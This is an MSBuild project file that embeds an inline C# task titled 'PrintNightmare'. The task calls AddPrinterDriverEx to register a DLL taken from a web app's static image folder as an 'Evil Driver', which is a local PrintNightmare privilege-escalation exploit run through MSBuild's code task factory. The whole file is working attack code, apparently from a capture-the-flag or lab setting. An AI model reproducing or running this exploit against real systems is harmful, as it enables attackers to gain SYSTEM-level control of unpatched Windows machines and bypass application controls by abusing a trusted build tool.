<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="PrintNightmare">
    <Nightmare/>
  </Target>
  <UsingTask TaskName="Nightmare" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Reference Include="System.DirectoryServices"/>
      <Code Type="Class" Language="cs">
        <![CDATA[
using System;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.DirectoryServices;

public class Nightmare : Task, ITask
{
    [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool AddPrinterDriverEx(
        string pName,
        uint Level,
        ref DRIVER_INFO_2 pDriverInfo,
        uint dwFileCopyFlags);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct DRIVER_INFO_2
    {
        public uint cVersion;
        [MarshalAs(UnmanagedType.LPTStr)]
        public string pName;
        [MarshalAs(UnmanagedType.LPTStr)]
        public string pEnvironment;
        [MarshalAs(UnmanagedType.LPTStr)]
        public string pDriverPath;
        [MarshalAs(UnmanagedType.LPTStr)]
        public string pDataFile;
        [MarshalAs(UnmanagedType.LPTStr)]
        public string pConfigFile;
    }

    const uint APD_COPY_ALL_FILES = 0x00000004;
    const uint APD_COPY_FROM_DIRECTORY = 0x00000010;

    public override bool Execute()
    {
        string dllPath = @"C:\Web\Eloquia\static\assets\images\blog\nightmare.dll";

        DRIVER_INFO_2 di = new DRIVER_INFO_2();
        di.cVersion = 3;
        di.pName = "Evil Driver";
        di.pEnvironment = "Windows x64";
        di.pDriverPath = dllPath;
        di.pDataFile = dllPath;
        di.pConfigFile = dllPath;

        bool result = AddPrinterDriverEx(null, 2, ref di, APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY);

        if (!result)
        {
            int error = Marshal.GetLastWin32Error();
            Console.WriteLine("[!] Failed with error: " + error);
        }
        else
        {
            Console.WriteLine("[+] PrintNightmare executed!");
        }

        return true;
    }
}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
